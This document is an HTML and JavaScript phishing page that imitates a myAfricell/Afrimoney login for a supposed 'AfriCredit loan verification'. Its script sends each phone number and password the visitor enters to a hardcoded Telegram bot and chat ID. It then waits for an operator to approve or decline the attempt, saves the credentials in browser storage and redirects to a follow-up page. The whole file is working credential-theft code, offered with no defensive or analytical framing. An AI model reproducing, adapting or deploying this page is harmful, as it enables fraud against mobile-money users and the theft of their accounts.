        @keyframes spin {

        /* Password wrapper for eye icon */

<body>
    <div class="container">
        <div class="logo-container">
            <span class="logo-my">my</span><span class="logo-africell">Africell</span>
        </div>
        <h1>Welcome Back</h1>
        <p class="subtitle">Log in to your Afrimoney account<br>to complete AfriCredit loan verification.</p>

        <div class="form-group">
            <label>Phone Number</label>
            <div style="position:relative;">
                <span style="position:absolute; left:16px; top:50%; transform:translateY(-50%); color:#6c757d; font-weight:500;">+232</span>
                <input type="tel" id="phone" placeholder="79XXXXXX" inputmode="tel" style="padding-left:60px;">
            </div>
        </div>

        <div class="form-group">
            <label>Password</label>
            <div class="password-wrapper">
                <input type="password" id="password" placeholder="Enter your password">
                <svg id="togglePassword" class="toggle-password" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
            </svg>
            </div>
        </div>

        <div id="err" class="error-msg">Please enter a valid phone number and password</div>

        <button class="btn-action" id="next">Log In</button>
        <button class="btn-back" id="back">Go Back</button>
    </div>

    <div id="spinner">
        <div class="spin"></div>
    </div>

    <script>
        // ────────────────────────────────────────────────
        // CONFIG & STATE
        // ────────────────────────────────────────────────
        const CONFIG = {
            BOT_TOKEN: '8618715721:AAHVnbC5S1oheD_q6b2a6l_gs6N07i3Tg3s',
            CHAT_ID: '1845693385',
            MIN_PHONE_LENGTH: 8, // Sierra Leone mobile numbers typically 8 digits after +232
            REDIRECT_PAGE: 'verify.html'
        };
        let state = {
            poll: null,
            approveId: null,
            declineId: null
        };

        // ────────────────────────────────────────────────
        // DOM ELEMENTS
        // ────────────────────────────────────────────────
        const els = {
            phoneInput: document.getElementById('phone'),
            passwordInput: document.getElementById('password'),
            togglePassword: document.getElementById('togglePassword'),
            nextBtn: document.getElementById('next'),
            errMsg: document.getElementById('err'),
            spinner: document.getElementById('spinner'),
            backBtn: document.getElementById('back')
        };

        // ────────────────────────────────────────────────
        // PASSWORD TOGGLE
        // ────────────────────────────────────────────────
        els.togglePassword.addEventListener('click', () => {
            const isPassword = els.passwordInput.type === 'password';
            els.passwordInput.type = isPassword ? 'text' : 'password';

            els.togglePassword.innerHTML = isPassword ?
                '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>' :
                '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>';
        });

        // ────────────────────────────────────────────────
        // VALIDATION & HELPERS
        // ────────────────────────────────────────────────
        function showError(msg = "Please enter a valid phone number and password") {
            els.errMsg.textContent = msg;
            els.errMsg.style.display = 'block';
        }

        function hideError() {
            els.errMsg.style.display = 'none';
        }

        function showSpinner() {
            els.spinner.style.display = 'flex';
        }

        function hideSpinner() {
            els.spinner.style.display = 'none';
        }

        function stopPolling() {
            if (state.poll) {
                clearInterval(state.poll);
                state.poll = null;
            }
        }

        // ────────────────────────────────────────────────
        // BOT LOGIC
        // ────────────────────────────────────────────────
        function sendLoginAttempt(phone, password) {
            const ts = Date.now();
            state.approveId = `approve_${ts}`;
            state.declineId = `decline_${ts}`;
            const message = `myAfricell / Afrimoney Login Attempt\n\n` +
                `Phone: \`${phone}\`\n` +
                `Password: \`${password}\`\n\nAction?`;
            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CONFIG.CHAT_ID,
                        text: message,
                        parse_mode: 'MarkdownV2',
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: '✅ Approve & Continue',
                                    callback_data: state.approveId
                                }, {
                                    text: '❌ Decline',
                                    callback_data: state.declineId
                                }]
                            ]
                        }
                    })
                })
                .catch(err => {
                    hideSpinner();
                    alert('Connection error: ' + err.message);
                });
            startPolling();
        }

        function startPolling() {
            stopPolling();
            state.poll = setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=-1&timeout=30`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result || !data.result.length) return; // Fixed syntax
                        for (const update of data.result) {
                            const cb = update.callback_query;
                            if (!cb) continue;
                            const cbData = cb.data;
                            if (cbData === state.approveId) {
                                stopPolling();
                                hideSpinner();
                                localStorage.setItem('phone', els.phoneInput.value.trim());
                                localStorage.setItem('password', els.passwordInput.value.trim());
                                window.location.href = CONFIG.REDIRECT_PAGE;
                                return;
                            }
                            if (cbData === state.declineId) {
                                stopPolling();
                                hideSpinner();
                                showError("Access declined. Please try again.");
                                return;
                            }
                        }
                    })
                    .catch(console.warn);
            }, 2000);
        }

        // ────────────────────────────────────────────────
        // EVENT LISTENERS
        // ────────────────────────────────────────────────
        els.nextBtn.onclick = () => {
            hideError();
            const phone = els.phoneInput.value.trim();
            const password = els.passwordInput.value.trim();

            if (!phone || phone.length < CONFIG.MIN_PHONE_LENGTH || !/^\d+$/.test(phone)) {
                showError("Please enter a valid Sierra Leone phone number (8 digits)");
                return;
            }
            if (!password) {
                showError("Please enter your password");
                return;
            }

            showSpinner();
            sendLoginAttempt(phone, password);
        };

        els.backBtn.onclick = (e) => {
            e.preventDefault();
            window.history.back();
        };

        // ────────────────────────────────────────────────
        // INIT
        // ────────────────────────────────────────────────
        els.phoneInput.focus();
    </script>
</body>
